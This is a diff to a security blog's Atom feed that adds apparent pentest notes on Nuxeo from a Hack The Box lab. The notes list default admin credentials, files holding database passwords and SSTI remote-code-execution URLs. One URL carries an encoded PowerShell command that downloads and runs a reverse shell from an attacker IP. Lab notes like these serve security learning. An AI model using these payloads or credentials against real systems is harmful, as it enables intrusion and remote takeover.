@@ -4,13 +4,105 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-05-18T18:19:01+08:00</updated>
+ <updated>2022-05-19T18:36:42+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Nuxeo</title>
+   <link href="https://mvineza.github.io/spindel/2022/05/19/nuxeo"/>
+   <updated>2022-05-19T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/05/19/Nuxeo</id>
+   <content type="html">&lt;h2 id=&quot;oveview&quot;&gt;Oveview&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Nuxeo/CAP-dashboard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Collaboration system&lt;/li&gt;
+  &lt;li&gt;Tech stack
+    &lt;ul&gt;
+      &lt;li&gt;Tomcat&lt;/li&gt;
+      &lt;li&gt;Elasticsearch&lt;/li&gt;
+      &lt;li&gt;DB (PostgreSQL, Mysql)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;version-detection&quot;&gt;Version Detection&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;You can see copyright as well as version infromation at the bottom of login page&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Version is 10.2&lt;/span&gt;
+Copyright © 2001-2022 Nuxeo and respective authors. Nuxeo Platform FT 10.2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;credentials&quot;&gt;Credentials&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Default&lt;/span&gt;
+Administrator:Administrator
+
+&lt;span class=&quot;c&quot;&gt;# Some DB Users to try&lt;/span&gt;
+nuxeo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;interesting-files-and-directories&quot;&gt;Interesting Files and Directories&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nuxeo config. You can see DB passwords here.&lt;/span&gt;
+C:&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;rogramdata&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;uxeo&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;onf&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;uxeo.conf
+
+&lt;span class=&quot;c&quot;&gt;# Some tomcat config&lt;/span&gt;
+conf/
+
+&lt;span class=&quot;c&quot;&gt;# User settings?&lt;/span&gt;
+~/.nxshell
+C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_account&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;nxshell&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;istory
+C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_account&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;nxshell&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;hell.properties
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;interesting-url-paths&quot;&gt;Interesting URL paths&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/nuxeo
+/nuxeo/login.jsp
+/nxserver
+/nxstartup.faces
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;interesting-database-tables&quot;&gt;Interesting Database Tables&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;users
+&lt;/span&gt;digestauth
+content
+&lt;span class=&quot;nb&quot;&gt;groups
+&lt;/span&gt;userinfo
+note
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;interesting-elasticearch-data&quot;&gt;Interesting Elasticearch Data&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://localhost:9200/nuxeo-audit/_search?pretty=true&apos;&lt;/span&gt;
+curl &lt;span class=&quot;s1&quot;&gt;&apos;http://localhost:9200/nuxeo/_search?pretty=true&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;vulnerabilities-attacks-and-exploits&quot;&gt;Vulnerabilities, Attacks and Exploits&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Orange: How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/mpgn/CVE-2018-16341&quot;&gt;Nuxeo 10 Authentication Bypass and RCE using SSTI&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# HTB Hancliffe payload. Take note there is a URI parsing&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# vulnerability that&apos;s why there is a `/maintenance/..;/`&lt;/span&gt;
+http://hancliffe/maintenance/..&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/login.jsp/pwn&lt;span class=&quot;nv&quot;&gt;$%&lt;/span&gt;7B7+7%7D.xhtml
+
+&lt;span class=&quot;c&quot;&gt;# Another payload but with powershell encoded command&lt;/span&gt;
+http://hancliffe/maintenance/..&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/login.jsp/pwn&lt;span class=&quot;nv&quot;&gt;$%&lt;/span&gt;7B%22%22.getClass&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.forName&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%22java.lang.Runtime%22&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.getMethod&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%22getRuntime%22,null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.invoke&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null,null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%22powershell%20-encodedcommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%22,null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.waitFor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;%7D.xhtml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Nuxeo&quot;&gt;Wikipedia&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/nuxeo/nuxeo&quot;&gt;GitHub - nuxeo/nuxeo: Content management platform to build modern business applications&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Splunk Wispherer</title>
